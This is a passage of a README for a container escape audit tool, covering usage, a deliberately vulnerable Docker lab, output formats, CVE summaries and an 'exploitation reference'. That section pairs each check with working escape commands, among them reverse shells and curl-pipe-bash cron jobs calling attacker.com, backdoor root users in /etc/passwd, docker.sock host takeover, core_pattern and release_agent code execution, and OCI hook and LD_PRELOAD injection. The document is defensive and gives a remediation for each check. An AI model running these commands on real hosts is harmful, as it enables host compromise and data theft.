--check-updates    Check the GitHub repo for a newer script release and a
                   newer CVE database, print the result, and EXIT — this is
                   a standalone mode; it does not also run the full audit.
                   Completely opt-in — no network call is made unless this
                   flag is given. Prints:
                     ## Update Check:
                     [Script]: Yes|No
                     [CVEs]: Yes|No
                   If GitHub can't be reached, prints that plainly and tells
                   you to check the repo manually. Combined with --json,
                   currently produces no output (see "Checking for updates"
                   below). See that section for exactly what it compares.
--dump-state       Print the internal system-state registry (MAC/userns/proc-sys
                   signals) after the run — useful for debugging CVE verdicts
```

### Examples

```bash
# Standard run
./container_escape_audit.sh

# Custom report path (used exactly as given, no timestamp added)
./container_escape_audit.sh --report /tmp/audit_$(hostname).txt

# Custom report NAME (timestamp still appended automatically)
./container_escape_audit.sh --report-name "$(hostname)"
# -> e.g. prod-node-07_20260714_153000.txt

# Check whether a newer script version or CVE database is available
./container_escape_audit.sh --check-updates --no-report

# JSON output, filter CRITICAL findings
./container_escape_audit.sh --json --no-report | jq '.findings[] | select(.severity=="CRITICAL")'

# Quiet terminal output with report
./container_escape_audit.sh --quiet --report ./report.txt

# Use a centralised or updated CVE database
./container_escape_audit.sh --cve-conf /etc/audit/cve_checks.conf
```

### Checking for updates

`--check-updates` compares two things independently, since the script and the CVE database can each be updated on their own schedule:

| What | Compared against | How |
|---|---|---|
| Script version | `release.txt` in the repo root (just a bare version string, e.g. `4.7`) | Semantic-version comparison against this script's own `SCRIPT_VERSION` constant |
| CVE database | `cve_release.txt` in the repo root (just a bare date, e.g. `2026-07-20`) | Date comparison against the **local** `cve_checks.conf`'s own `# Last updated: YYYY-MM-DD` trailer line — so it reflects whichever conf file you're actually running with, not an assumption baked into the script |

No network call of any kind is made unless `--check-updates` is explicitly passed — this tool otherwise makes none. If GitHub can't be reached (no network, blocked egress, or the files are temporarily unavailable), it prints that plainly and tells you to check the repository manually rather than guessing or failing silently. A result of `Unknown` for either line means the corresponding remote file was missing or unreadable, not that you're up to date — treat it the same as "couldn't check."

**Maintainers:** `release.txt` and `cve_release.txt` need to be kept current as part of the release process — see [Releasing (maintainers)](#releasing-maintainers).

### Running inside a Kubernetes pod

```bash
kubectl cp container_escape_audit.sh <namespace>/<pod>:/tmp/audit.sh
kubectl exec -n <namespace> <pod> -- bash /tmp/audit.sh --report /tmp/report.txt
kubectl cp <namespace>/<pod>:/tmp/report.txt ./audit_report.txt
```

### Running as a Kubernetes Job

```yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: container-escape-audit
spec:
  template:
    spec:
      restartPolicy: Never
      containers:
        - name: audit
          image: alpine:latest
          command:
            - sh
            - -c
            - |
              apk add --no-cache bash curl && \
              curl -sO https://raw.githubusercontent.com/liamromanis101/K8s-container_escape_audit/main/container_escape_audit.sh && \
              curl -sO https://raw.githubusercontent.com/liamromanis101/K8s-container_escape_audit/main/cve_checks.conf && \
              chmod +x container_escape_audit.sh && \
              ./container_escape_audit.sh --json
```

```bash
kubectl apply -f audit-job.yaml
kubectl wait --for=condition=complete job/container-escape-audit --timeout=120s
kubectl logs job/container-escape-audit
kubectl delete job container-escape-audit
```

By default the job runs with whatever the cluster's default security context is. That's intentional -- the audit reflects the real permissions available to a workload. If you want to test a specific security context, add the relevant `securityContext` or `serviceAccountName` fields before applying.

## Lab setup for testing

This sets up a deliberately misconfigured Docker container that exercises most of the checks. Use an isolated VM only -- not on a production host or anything with sensitive data on it.

### Prerequisites

```bash
# Add yourself to the docker group
sudo usermod -aG docker $USER
newgrp docker

# Or just prefix docker commands with sudo throughout
```

### Step 1 -- start the vulnerable container

```bash
sudo docker run -d \
  --name cea_vulnerable \
  --hostname cea-target \
  --privileged \
  --pid=host \
  --ipc=host \
  --dns=8.8.8.8 \
  --dns=8.8.4.4 \
  --security-opt apparmor=unconfined \
  --security-opt seccomp=unconfined \
  --cap-add SYS_ADMIN \
  --cap-add SYS_PTRACE \
  --cap-add BPF \
  -v /var/run/docker.sock:/var/run/docker.sock \
  -v /sys:/sys:rw \
  -v $(pwd):/audit:ro \
  -e DATABASE_PASSWORD=supersecret \
  -e AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLEfakekey \
  -e GITHUB_TOKEN=ghp_fakeTokenForTesting \
  -e API_KEY=fake-api-key-12345 \
  ubuntu:22.04 \
  tail -f /dev/null
```

The `--dns` flags are needed because `--pid=host` combined with `--privileged` can break DNS resolution on some systems.

### Step 2 -- verify internet access

```bash
sudo docker exec -it cea_vulnerable bash
```

Once inside:

```bash
ping -c1 archive.ubuntu.com
# If that fails: echo "nameserver 8.8.8.8" > /etc/resolv.conf
```

### Step 3 -- install packages

```bash
apt-get update -qq && apt-get install -y \
  curl python3 sudo procps \
  libcap2-bin cron vim util-linux
```

### Step 4 -- configure the misconfigurations

```bash
useradd -m -s /bin/bash testuser
echo 'testuser:password' | chpasswd
echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
echo '* * * * * root echo vuln > /tmp/cron_test' > /etc/cron.d/testlab
service cron start
chmod u+s /usr/bin/find
chmod u+s /usr/bin/python3
```

### Step 5 -- run the audit

```bash
bash /audit/container_escape_audit.sh
```

Save a report and pull it to the host:

```bash
# Inside the container
bash /audit/container_escape_audit.sh --report /tmp/audit_report.txt

# From a second terminal on the host
sudo docker cp cea_vulnerable:/tmp/audit_report.txt ./audit_report.txt
```

### Step 6 -- tear down

```bash
sudo docker rm -f cea_vulnerable
```

### What to expect

| Check | Expected result | Notes |
|---|---|---|
| 1 -- Privileged | CRITICAL | --privileged flag |
| 2 -- Capabilities | HIGH x4+ | SYS_ADMIN, SYS_PTRACE, BPF etc. |
| 3 -- Namespaces | HIGH x2 | --pid=host, --ipc=host |
| 4 -- Mounts | CRITICAL | docker.sock, /sys |
| 5 -- /proc | CRITICAL | core_pattern writable via privileged |
| 7 -- Env secrets | MEDIUM x4 | DATABASE_PASSWORD, AWS key etc. |
| 8 -- Cron | HIGH | /etc/cron.d/testlab writable |
| 9 -- Auth files | CRITICAL | /etc/sudoers modified |
| 11 -- Seccomp | MEDIUM x2 | Both unconfined |
| 12 -- cgroup | CRITICAL | release_agent writable |
| 13 -- SUID | MEDIUM | find, python3 |
| 24 -- Copy Fail | CRITICAL or INFO | Depends on host kernel patch status |
| 27 -- UID mapping | HIGH | Running as root, no userns remap |
| 28 -- eBPF | CRITICAL | CAP_BPF + seccomp unconfined |
| 29 -- debugfs | MEDIUM | /sys mounted |
| 31 -- Runtime socket | CRITICAL | docker.sock mounted |
| 34 -- splice/pipe2 | HIGH | seccomp unconfined |
| 35 -- /proc PIDs | MEDIUM | --pid=host |

Checks that won't fire here (require real infrastructure): Check 15 (cloud IMDS), Check 16 (Kubelet API), Check 25 (real NVIDIA CTK), Check 30 (live Kubernetes API).

## Output

### Terminal

```
========================================================
  container_escape_audit.sh v4.5
  Container escape vector detection
  FOR AUTHORISED SECURITY ASSESSMENTS ONLY
========================================================

--- 1. Privileged container ---
[CRIT]  Container appears PRIVILEGED (CapEff=000001ffffffffff)

--- 4. Dangerous filesystem mounts ---
[CRIT]  Container runtime socket accessible: /var/run/docker.sock

--- 24. Copy Fail (CVE-2026-31431) ---
[CRIT]  VULNERABLE to Copy Fail -- AEAD socket bindable, kernel 6.5.0-21-generic

==================== SUMMARY ====================
  [CRITICAL] Container is running in privileged mode
  [CRITICAL] Container runtime socket accessible: /var/run/docker.sock
  [CRITICAL] Copy Fail (CVE-2026-31431) AF_ALG exposure
  [HIGH    ] Kubernetes service account token is readable
  [MEDIUM  ] Seccomp is disabled for this container

  CRITICAL: 3  |  HIGH: 4  |  MEDIUM: 5  |  INFO: 2
```

### JSON

```json
{
  "tool": "container_escape_audit",
  "version": "4.3",
  "timestamp": "2026-05-01T10:32:00Z",
  "host": "cea-target",
  "kernel": "6.5.0-21-generic",
  "findings": [
    {
      "id": "cve_2026_31431_copy_fail",
      "severity": "CRITICAL",
      "title": "Copy Fail (CVE-2026-31431) AF_ALG exposure",
      "what": "AF_ALG socket family is accessible and the authencesn AEAD algorithm can be bound...",
      "impact": "Allows controlled 4-byte writes into the page cache of any readable executable...",
      "exploitability": "Trivial. A single Python script achieves root reliably...",
      "recommendation": "Apply kernel patches from your distribution immediately..."
    }
  ]
}
```

## Requirements

| Tool | Required | Used for |
|---|---|---|
| `bash` | Yes | Script execution |
| `grep`, `awk`, `find`, `cat` | Yes | Core checks |
| `python3` | Optional | Copy Fail (24), eBPF (28), splice (34), io_uring (48), kTLS ULP (49) |
| `curl` | Optional | IMDS and kubelet API checks |
| `kubectl` | Optional | Kubernetes RBAC enumeration |
| `capsh` | Optional | Human-readable capability decoding |
| `ip` | Optional | Node IP detection for kubelet checks |
| `keyctl` | Optional | Kernel keyring enumeration (32) |
| `sestatus` | Optional | SELinux status |

For verifying releases (Option A): `gh` (GitHub CLI) and `slsa-verifier`. Both are optional and only needed if you verify provenance, which is recommended for real assessments.

## Severity levels

| Level | Meaning |
|---|---|
| CRITICAL | Immediate host escape likely with minimal effort |
| HIGH | Significant risk, exploitable with moderate effort or in combination with other findings |
| MEDIUM | Defence-in-depth gap, increases exploitability of other findings |
| INFO | Recorded for context and cross-referencing |

A single CRITICAL finding is generally enough for a complete host compromise. Multiple findings in combination can elevate lower-severity issues -- a MEDIUM seccomp finding combined with a HIGH capability finding can together constitute a practical escape path.

**`[MITIGATED]` console tag.** For `check_type=compound` CVEs, when the kernel is affected but a real control was actually found and confirmed in place (specifically: the vulnerable module is confirmed blacklisted in `/etc/modprobe.d`), the terminal tag reads `[MITIGATED]` instead of the plain severity word — but rendered in *that downgraded severity's own colour* (e.g. yellow for a CRITICAL-ceiling CVE downgraded to HIGH), not a separate colour, so its urgency at a glance still matches its actual risk level. This is deliberately narrower than "severity is lower than the CVE's default" — a related state (module simply not yet loaded, but *not* blacklisted, so it could auto-load at any time) also computes below the CVE's ceiling but is **not** labelled `MITIGATED`, since no protective control was actually found there; it still shows the plain severity word. This distinction exists specifically so `MITIGATED` never overstates protection that isn't really there. Note this is a console-display label only — the structured severity value used in JSON output, `--fail-on`-style thresholds, and severity counts is always the plain CRITICAL/HIGH/MEDIUM value, unaffected by this label.

## Escape techniques covered

Checks 1-23 cover the established container escape primitives: Docker socket escape, privileged container mount, cgroup v1 release_agent, core_pattern pipe handler, Shocker / CAP_DAC_READ_SEARCH, CAP_SYS_ADMIN namespace re-entry, kernel module loading, DirtyPipe (CVE-2022-0847), DirtyCOW (CVE-2016-5195), Kubernetes service account abuse, kubelet unauthenticated exec, cloud IMDS credential theft, host namespace escape via nsenter, ld.so.preload injection, and /dev/mem access.

Checks 24-35 add coverage for more recent and less commonly checked vectors: Copy Fail (CVE-2026-31431) AF_ALG page cache write, NVIDIAScape (CVE-2025-23266) OCI hook LD_PRELOAD injection, runc masked path race (CVE-2025-31133/-52565/-52881), root-in-container UID mapping, eBPF kernel memory inspection, debugfs/tracefs ftrace exposure, Kubernetes RBAC active probing, additional runtime sockets (Podman, BuildKit, Kata), kernel keyring extraction, OCI hook directory injection, splice/pipe2 syscall surface, and procfs namespace fd leakage.

Checks 48-51 extend coverage to recently disclosed container-escape and LPE attack surfaces: io_uring reachability (CVE-2026-43121 zcrx out-of-bounds write and the broader io_uring LPE class), kTLS/sockmap ULP attach surface (the "Reverse Order" and `tls_sk_proto_close()` use-after-free reports), Kata Containers agent-socket exposure (CVE-2026-41326 CopyFile symlink subversion), and arm64 KVM/vGIC-ITS guest-to-host exposure (CVE-2026-46316 ITScape — the first public KVM/arm64 escape).

The config-driven CVE engine additionally covers the most recent kernel privilege-escalation and container-escape issues, including ptrace credential hijack (CVE-2026-46333), nf_tables anonymous-set use-after-free (CVE-2026-23111), Fragnesia ESP (CVE-2026-46300), ITScape KVM/arm64 escape (CVE-2026-46316), Januscape KVM/x86 shadow-MMU escape (CVE-2026-53359, with its required companion fix CVE-2026-46113), an IPv6 fragmentation container escape (CVE-2026-53362), the epoll `ep_remove()` race UAF Bad Epoll (CVE-2026-46242), the futex priority-inheritance UAF GhostLock (CVE-2026-43499), the io_uring zcrx OOB write (CVE-2026-43121), the ksmbd remote kernel UAF (CVE-2022-47939), and a set of container-runtime CVEs tracked as advisory entries (Kata CVE-2026-41326, containerd CVE-2026-46680, Podman CVE-2026-55686, runc CVE-2026-41579 plus the historical runc escapes CVE-2019-5736 and CVE-2024-21626 "Leaky Vessels", and the classic cgroup release_agent escape CVE-2022-0492 / CISA KEV). See the [Recent CVEs](#recent-cves) detail section below.

## Exploitation reference

What an attacker can actually do with each finding. For authorised testing and defensive purposes only.

<details>
<summary><h3>Container configuration</h3></summary>

#### Check 1 -- Privileged container (CRITICAL)

```bash
mkdir /tmp/host && mount /dev/sda1 /tmp/host
chroot /tmp/host bash

# Or write a reverse shell into the host crontab
echo '* * * * * root bash -i >& /dev/tcp/attacker.com/4444 0>&1' \
  >> /tmp/host/etc/crontab
```

Remediation: Remove `--privileged`. Use `securityContext.capabilities` to grant only what the workload actually needs.

#### Check 2 -- Dangerous Linux capabilities (HIGH)

| Capability | Exploit path |
|---|---|
| `CAP_SYS_ADMIN` | Mount filesystems, load kernel modules, ptrace any process |
| `CAP_SYS_PTRACE` | Attach to any host process, inject shellcode |
| `CAP_SYS_MODULE` | Load a malicious kernel module |
| `CAP_NET_ADMIN` | Reroute traffic, ARP spoofing, modify host iptables |
| `CAP_DAC_READ_SEARCH` | Shocker exploit -- read any host file by inode |
| `CAP_BPF` | Load eBPF programs to inspect all kernel memory and function calls |

```bash
# With CAP_SYS_PTRACE -- enter all host namespaces via PID 1
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Remediation:

```yaml
securityContext:
  capabilities:
    drop: ["ALL"]
    add: ["NET_BIND_SERVICE"]
```

#### Check 3 -- Host namespace sharing (HIGH)

```bash
# hostPID: true -- enter host via PID 1
nsenter -t 1 -m -u -i -n -p -- bash

# hostNetwork: true -- sniff all node traffic
tcpdump -i eth0

# hostIPC: true -- read host shared memory
ipcs -a
```

Remediation:

```yaml
spec:
  hostPID: false
  hostNetwork: false
  hostIPC: false
```

#### Check 11 -- Seccomp / AppArmor / SELinux disabled (MEDIUM)

```bash
unshare -UrmC --fork bash
```

Remediation:

```yaml
securityContext:
  seccompProfile:
    type: RuntimeDefault
```

#### Check 27 -- User namespace UID mapping (HIGH)

Without user namespace remapping, UID 0 inside the container is UID 0 on the host. Any mount escape, socket access, or capability exploit yields host root directly -- no UID boundary to cross.

Remediation: Enable userns-remap in Docker (`userns-remap: default` in `/etc/docker/daemon.json`). In Kubernetes, use rootless containers or configure user namespace support (stable in 1.30+). Set `runAsNonRoot: true` in pod security context.

</details>

<details>
<summary><h3>Filesystem and mounts</h3></summary>

#### Check 4 -- Dangerous host filesystem mounts (CRITICAL)

```bash
# Docker socket -- instant host root
docker -H unix:///var/run/docker.sock run -v /:/host --privileged alpine \
  chroot /host bash

# /etc writable -- add root user
echo 'backdoor::0:0::/root:/bin/bash' >> /etc/passwd
su backdoor
```

Remediation: Never mount the Docker or containerd socket into application containers. Use `readOnly: true` for any required mounts.

#### Check 5 -- /proc filesystem exposure (CRITICAL)

```bash
# Execute arbitrary code as root via core_pattern
echo '|/tmp/payload' > /proc/sys/kernel/core_pattern
kill -SIGSEGV $$

# Read host process environment
cat /proc/1/environ | tr '\0' '\n'

# Reboot or crash the host
echo b > /proc/sysrq-trigger
```

Remediation: Mount `/proc/sys` read-only. Deny writes via seccomp.

#### Check 8 -- Writable cron directories (HIGH)

```bash
echo '* * * * * root curl http://attacker.com/shell.sh | bash' \
  > /etc/cron.d/backdoor
```

Remediation:

```yaml
securityContext:
  readOnlyRootFilesystem: true
```

#### Check 9 -- Writable authentication files (CRITICAL)

```bash
echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd
su pwned

echo 'ALL ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers
```

Remediation: Use `readOnlyRootFilesystem: true`. Never bind-mount `/etc` from the host.

#### Check 13 -- SUID/SGID binaries (MEDIUM)

```bash
find / -perm -4000 -type f 2>/dev/null

# If /usr/bin/find has SUID bit
find . -exec /bin/bash -p \; -quit
```

Remediation:

```dockerfile
RUN find / -xdev -perm /6000 -type f -exec chmod a-s {} \;
```

#### Check 17 -- Writable dynamic linker config (HIGH)

```bash
echo '/tmp/evil_lib' > /etc/ld.so.preload
# All subsequent SUID binary executions load the malicious library first
```

Remediation: Use `readOnlyRootFilesystem: true`.

#### Check 23 -- OverlayFS upper directory (MEDIUM)

Access to the OverlayFS upper layer allows modifying files that appear read-only, or reading data that was "deleted" in a later image layer. Useful for recovering secrets removed during image build.

Remediation: Restrict access to `/var/lib/docker` and `/var/lib/containerd` on the host.

#### Check 33 -- OCI hook injection (CRITICAL)

```bash
cat > /run/oci/hooks.d/backdoor.json << 'EOF'
{
  "version": "1.0.0",
  "hook": {"path": "/tmp/evil.sh"},
  "when": {"always": true},
  "stages": ["prestart"]
}
EOF
# /tmp/evil.sh runs on the host at the next container start
```

Remediation: Never mount OCI hook directories into containers. Related to NVIDIAScape (CVE-2025-23266) -- both exploit the OCI hook trust boundary.

</details>

<details>
<summary><h3>Kernel</h3></summary>

#### Check 10 -- /dev/mem and ptrace scope (CRITICAL)

```bash
dd if=/dev/mem bs=1 skip=$((0x100000)) count=1024 | strings

# ptrace_scope=0 -- attach to a privileged host process
gdb -p $(pgrep -n root)
```

Remediation: Ensure `/dev/mem` is not accessible. Set `kernel.yama.ptrace_scope=1` on all nodes.

#### Check 12 -- cgroup v1 release_agent (CRITICAL)

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Remediation: Migrate to cgroup v2. Block `mount` syscalls via seccomp.

#### Check 14 -- Kernel CVEs (HIGH)

| CVE | Kernels affected | Impact |
|---|---|---|
| DirtyPipe CVE-2022-0847 | 5.8 to 5.16.11 | Overwrite read-only files via pipe splice |
| DirtyCOW CVE-2016-5195 | before 4.8.3 | Race condition write to read-only memory-mapped files |

Remediation: Patch the host kernel. Verify with `uname -r`.

#### Check 28 -- eBPF exposure (CRITICAL)

```bash
# Attach a kprobe to any kernel function across the host
bpftrace -e 'kprobe:vfs_read { printf("%s\n", str(arg1)); }'
# Captures arguments from all processes on the node
```

Remediation: Remove `CAP_BPF` and `CAP_SYS_ADMIN`. Apply seccomp to block `bpf(2)` (syscall 321 on x86_64). Set `kernel.unprivileged_bpf_disabled=1`.

#### Check 29 -- debugfs / tracefs (HIGH)

```bash
echo function > /sys/kernel/debug/tracing/current_tracer
echo 1 > /sys/kernel/debug/tracing/tracing_on
cat /sys/kernel/debug/tracing/trace
# Captures function arguments from all processes on the node
```

Remediation: Do not mount `/sys/kernel/debug` in containers.

#### Check 32 -- Kernel keyring (HIGH)

```bash
# List session keys (LUKS, Kerberos TGTs, fscrypt keys)
keyctl show @s

# With CAP_SYS_ADMIN -- read key contents
keyctl print <key-id>
```

Remediation: Remove `CAP_SYS_ADMIN`. Apply seccomp to block `keyctl(2)` (syscall 250 on x86_64).

#### Check 34 -- Page cache write primitives (HIGH)

`splice(2)` and `pipe2(2)` are the two syscalls underlying both Copy Fail (CVE-2026-31431) and DirtyPipe (CVE-2022-0847). Their availability confirms that the attack surface is not reduced by seccomp filtering.

Remediation: Apply a seccomp profile restricting both syscalls if the workload doesn't need them. Ensure the kernel is fully patched.

#### Check 35 -- Procfs namespace leakage (MEDIUM)

```bash
# With host PID namespace -- enter host mount namespace via PID 1
nsenter -t 1 -m -- ls /
cat /proc/1/environ | tr '\0' '\n'
```

Remediation: Mount `/proc` with `hidepid=2`. Set `hostPID: false`.

</details>

<details>
<summary><h3>Recent CVEs</h3></summary>

#### Check 24 -- Copy Fail (CVE-2026-31431) (CRITICAL)

Disclosed April 29 2026. A logic bug in the Linux kernel's `algif_aead` cryptographic module allows an unprivileged user to perform controlled 4-byte writes into the page cache of any readable executable via `AF_ALG` and `splice()`. By corrupting the in-memory copy of a setuid binary, an attacker escalates to root. Affects every Linux distribution shipping a kernel built since 2017. A ~732-byte Python PoC achieves root on Ubuntu 24.04, Amazon Linux 2023, RHEL 10.1, and SUSE 16. No capabilities required. On the CISA KEV list with confirmed active exploitation.

The script checks three things: whether an `AF_ALG` socket can be created, whether the `authencesn(hmac(sha512),cbc(aes))` AEAD algorithm can be bound, and whether `splice(2)` and `pipe2(2)` are seccomp-blocked.

Remediation:
- Apply kernel patches from your distribution (released from late April 2026)
- Interim: `rmmod algif_aead && echo install algif_aead /bin/false >> /etc/modprobe.d/disable-algif_aead.conf`
- Block `AF_ALG` socket creation via seccomp if it's not needed

#### Check 25 -- NVIDIAScape (CVE-2025-23266) (CRITICAL)

Disclosed July 2025. The NVIDIA Container Toolkit's `createContainer` OCI hook inherits environment variables from the container image without sanitising them. Setting `LD_PRELOAD` in a Dockerfile causes the hook to load a malicious shared library into a privileged host process before namespace isolation completes. Three lines in a Dockerfile gets you host root. Affects all NVIDIA Container Toolkit versions up to and including 1.17.7. Particularly acute in shared GPU multi-tenant cloud environments.

```dockerfile
FROM nvidia/cuda:12.4.1-base
ENV LD_PRELOAD=/tmp/evil.so
COPY evil.so /tmp/
```

Remediation:
- Upgrade NVIDIA Container Toolkit to 1.17.8 or later, GPU Operator to 25.3.1 or later
- Interim: set `disable-cuda-compat-lib-hook = true` in `/etc/nvidia-container-toolkit/config.toml`
- Scan running pods for images with `LD_PRELOAD` pointing to writable paths

#### Check 26 -- runc masked path race (CVE-2025-31133 / CVE-2025-52565 / CVE-2025-52881) (CRITICAL)

Disclosed November 2025. Three related race conditions in runc's mount handling allow a low-privileged attacker who can spawn containers to write to arbitrary `/proc` files. CVE-2025-31133 and CVE-2025-52565 both allow writing to `/proc/sys/kernel/core_pattern` (arbitrary host code execution) and `/proc/sysrq-trigger` (immediate host reboot). CVE-2025-52881 additionally bypasses AppArmor and SELinux. Affects all runc versions prior to 1.2.8, 1.3.3, and 1.4.0-rc.3.

Remediation:
- Update runc to 1.2.8, 1.3.3, or 1.4.0-rc.3
- Enable user namespaces for containers (host root not mapped)
- AppArmor and SELinux provide limited protection due to CVE-2025-52881's LSM bypass

#### CVE-2026-46333 -- Ptrace Credential Hijack (HIGH)

Disclosed May 2026 by Qualys TRU. A logic flaw in the kernel's `__ptrace_may_access()` leaves a privileged process that is dropping its credentials briefly reachable through ptrace-family operations. Paired with `pidfd_getfd()`, an unprivileged local user can capture open file descriptors and authenticated IPC channels from a dying setuid process and reuse them under their own UID — disclosing files like `/etc/shadow` and SSH host keys, or executing commands as root. The vulnerable code dates to v4.10 (2016), but the public exploit path depends on `pidfd_getfd()` (added in v5.6, 2020), so 5.6 is the realistic exploitable floor. Working exploits are public.

The engine performs a `kernel_version` check against the 5.6+ range. On shared or multi-tenant container hosts, any unprivileged foothold becomes a path to host root.

Remediation:
- Apply the distribution kernel update
- Interim: set `kernel.yama.ptrace_scope=2` (blocks the public `pidfd_getfd` path)
- Rotate SSH host keys and review credentials handled by setuid processes if untrusted local users had access during the exposure window

#### CVE-2026-23111 -- nf_tables anonymous set UAF (HIGH)

Patched upstream February 2026; technical details and a working PoC published June 2026 by Exodus Intelligence. A use-after-free in the `nf_tables` subsystem, triggered through the kernel's handling of anonymous sets in rule definitions. Writing to freed kernel memory leads to type confusion or control-flow hijack, giving an unprivileged local user root. In containerised scenarios this translates directly to container escape, compromising the host kernel and co-located tenants.

The engine runs a `compound` check (kernel version plus `nf_tables` module presence — the module is already audited by check 47). Exploitation typically requires the ability to interact with `nf_tables` via `nft` or syscalls, usually needing unprivileged user namespaces.

Remediation:
- Apply the distribution kernel update (fix upstream since 5 Feb 2026)
- Interim: restrict unprivileged user namespaces with `user.max_user_namespaces=0`
- Ensure non-admin users cannot interact with `nft`

#### CVE-2026-46300 -- Fragnesia (HIGH)

Disclosed May 2026. A local privilege escalation in the kernel's ESP (Encapsulating Security Protocol) modules used for IPsec — the same `esp4`/`esp6` modules affected by one of the Dirty Frag vulnerabilities. In container deployments that may run arbitrary third-party workloads it may additionally facilitate container escape, though no container-escape PoC was published at disclosure.

The engine runs a `compound` check leveraging the existing `esp4`/`esp6` module audit (check 46). Because it shares modules with Dirty Frag, a host already mitigated for Dirty Frag is covered.

Remediation:
- Apply the distribution kernel update
- The Dirty Frag mitigation (disabling/blacklisting the `esp4` and `esp6` modules) also protects against this issue where those modules aren't required

#### CVE-2026-53359 -- Januscape (CRITICAL)

Disclosed July 6 2026 by Hyunwoo Kim (V4bel) via Google's kvmCTF. A use-after-free in the Linux kernel's KVM hypervisor, in the legacy shadow-MMU code shared between the Intel and AMD backends — the first publicly known guest-to-host KVM escape triggerable on both vendors. The vulnerable code dates to 2010 and is normally bypassed by modern hardware-assisted paging (EPT/NPT), but any guest that enables nested virtualization forces the host back through the shadow MMU, exposing the bug. The public PoC reliably panics the host; the researcher states an unreleased exploit achieves host code execution. x86_64-only — arm64 KVM is unaffected (see ITScape, CVE-2026-46316, for the arm64 equivalent). **Must be patched alongside its companion, CVE-2026-46113** — a separate UAF disclosed months earlier in the same shared code path; patching only one CVE leaves the host exploitable via the other.

The engine runs a `kernel_version` check gated `arch=x86_64` against the 2026-07-04 stable kernel batch.

Remediation:
- Patch to a kernel containing commit `81ccda30b4e8` (7.1.3, 6.18.38, 6.12.95, 6.6.144, 6.1.177, 5.15.211, or 5.10.260) **and** confirm commit `0cb2af2ea66a` (CVE-2026-46113) is also present
- Interim: disable nested virtualization for untrusted guests (`options kvm_intel nested=0` / `options kvm_amd nested=0` in `/etc/modprobe.d/`, requires a module reload/reboot to take effect) — this is a host-hypervisor mitigation, not something reachable from inside a guest
- Priority patch target: any host offering nested virtualization or "bring your own hypervisor" to untrusted tenants

#### CVE-2026-53362 -- IPv6 Fragmentation Container Escape (CRITICAL)

Fixed across the 2026-07-04 stable kernel batch. A bounds-check failure in `__ip6_append_data()`, the kernel function that assembles outgoing IPv6 fragments — building fragmented IPv6 traffic via a UDP socket using `MSG_SPLICE_PAGES` can write past the end of the socket buffer into adjacent `skb_shared_info`, chainable into arbitrary kernel read/write, credential overwrite, and container-to-host escape. Exploitation requires the ability to create network namespaces, which default RHEL 10-style configurations grant to unprivileged users via user namespaces. Likely — but not independently confirmed — the same bug Red Hat (RHSB-2026-009) and Finland's NCSC tracked pre-CVE-assignment as "ipv6_frag_escape".

The engine runs a `kernel_version` check against the affected range (introduced 6.0).

Remediation:
- Apply the distribution kernel update from the 2026-07-04 batch
- Interim: restrict unprivileged user-namespace creation (`kernel.unprivileged_userns_clone=0` on Debian/Ubuntu, `user.max_user_namespaces=0` on RHEL) — evaluate impact on rootless container workloads first
- Priority patch target: CI runners, shared developer systems, and multi-tenant Kubernetes nodes on an affected kernel lineage

#### CVE-2026-46242 -- Bad Epoll (CRITICAL)

Disclosed July 3 2026 by Jaeyoung Chung (Seoul National University) via kernelCTF. A race-condition use-after-free in the epoll subsystem's `ep_remove()` cleanup path — winning a ~6-instruction race lets an unprivileged local process turn an 8-byte UAF write into full root via a cross-cache attack. Public PoC reports 99% reliability on a 6.12 kernel. Introduced in ~v6.4 (kernels based on v6.1 and earlier are not affected); the fix (commit `a6dc643c6931`) landed upstream in April 2026, before public disclosure. Reachable from inside Chrome's renderer sandbox, and also roots Android devices on kernel v6.6+. Sibling of CVE-2026-43074, an earlier race in the same code path that Anthropic's Mythos model reportedly found and which was already fixed with lower urgency — Mythos did not find this one.

The engine runs a `kernel_version` check against the v6.4+ affected range. epoll is core kernel infrastructure with no module to blacklist and no runtime toggle.

Remediation:
- Apply the distribution kernel update containing commit `a6dc643c6931` — verify via package changelog, not `uname -r` alone
- No configuration-level workaround exists; patching is the only remediation
- Priority patch target: multi-tenant hosts, CI runners, and Android fleets on kernel v6.6+

#### CVE-2026-43499 -- GhostLock (CRITICAL)

Disclosed ~July 8 2026 by Nebula Security (team VEGA) via kernelCTF ($92,337 award). A ~15-year-old use-after-free in the kernel's futex priority-inheritance handling, triggerable via ordinary threading calls from any local unprivileged process — no special permission, configuration, or network access required. Working exploit reported 97% reliable and also escapes containers. Distro rollout was uneven at disclosure (some newest-release and cloud kernels patched, several LTS lines still vulnerable or in progress). **The original upstream fix introduced a separate regression bug, CVE-2026-53166** — confirm the final, cleaned-up fix is present, not just any patch labelled as fixing GhostLock. Documented by Nebula as the second half of an exploit chain ("IonStack") paired with a Firefox sandbox-escape bug (CVE-2026-10702, out of this database's kernel-only scope).

The engine runs a `kernel_version` check; `fixed_versions` is intentionally left `VERIFY` pending confirmed per-distro backport versions rather than guessed.

Remediation:
- Install your distribution's *current* kernel build and explicitly confirm the advisory/package version — do not assume the first kernel labelled as containing a GhostLock fix is the final one
- No complete interim workaround exists; `RANDOMIZE_KSTACK_OFFSET` and `STATIC_USERMODE_HELPER` build options raise exploit difficulty only, they do not close the hole
- Priority patch target: shared/multi-tenant machines, cloud servers, containers, and CI runners — the triggering conditions are routine local-process behaviour

#### CVE-2026-43494 -- PinTheft (HIGH)

